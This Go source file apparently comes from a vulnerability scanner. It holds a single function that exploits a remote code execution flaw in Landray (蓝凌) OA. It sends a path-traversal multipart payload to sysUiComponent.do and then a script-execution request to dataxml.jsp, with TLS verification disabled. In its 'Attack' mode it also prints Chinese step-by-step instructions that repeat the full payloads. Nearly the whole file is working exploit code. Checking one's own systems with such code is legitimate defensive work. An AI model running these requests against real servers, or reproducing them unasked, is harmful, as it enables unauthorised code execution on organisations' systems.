package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func LanLinOA_RCE(url string, Attack bool) error {
	payload1 := `------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition:form-data;name="method"

replaceExtend
------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition:form-data;name="extendId"

../../../../resource/help/km/review/
------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition:form-data;name="folderName"

../../../ekp/sys/common
------WebKitFormBoundaryL7ILSpOdIhIIvL51--`

	payload2 := `s_bean=ruleFormulaValidate&script=shell360&returnType=int&modelName=test`

	payload1 = strings.ReplaceAll(payload1, "\n", "\r\n")
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/sys/ui/sys_ui_component/sysUiComponent.do", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload1))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryL7ILSpOdIhIIvL51")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload1).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	url2 := fmt.Sprintf("%s/resource/help/km/review/dataxml.jsp", url)
	request2, err := http.NewRequest("POST", url2, strings.NewReader(payload2))
	if err != nil {
		return err
	}
	request2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request2.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload2).Len()))

	response2, err := client.Do(request2)
	if err != nil {
		return err
	}
	body2, err := ioutil.ReadAll(response2.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "1") && strings.Contains(string(body2), "公式运行时") {
		fmt.Println("[*]蓝凌OA RCE : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/sys/ui/sys_ui_component/sysUiComponent.do，并传入请求体`------WebKitFormBoundaryL7ILSpOdIhIIvL51\nContent-Disposition:form-data;name=\"method\"\n\nreplaceExtend\n------WebKitFormBoundaryL7ILSpOdIhIIvL51\nContent-Disposition:form-data;name=\"extendId\"\n\n../../../../resource/help/km/review/\n------WebKitFormBoundaryL7ILSpOdIhIIvL51\nContent-Disposition:form-data;name=\"folderName\"\n\n../../../ekp/sys/common\n------WebKitFormBoundaryL7ILSpOdIhIIvL51--`,随后再访问/resource/help/km/review/dataxml.jsp，并传入请求体`s_bean=ruleFormulaValidate&script=shell&returnType=int&modelName=test`\n")
		}
	}

	defer response.Body.Close()

	return nil
}
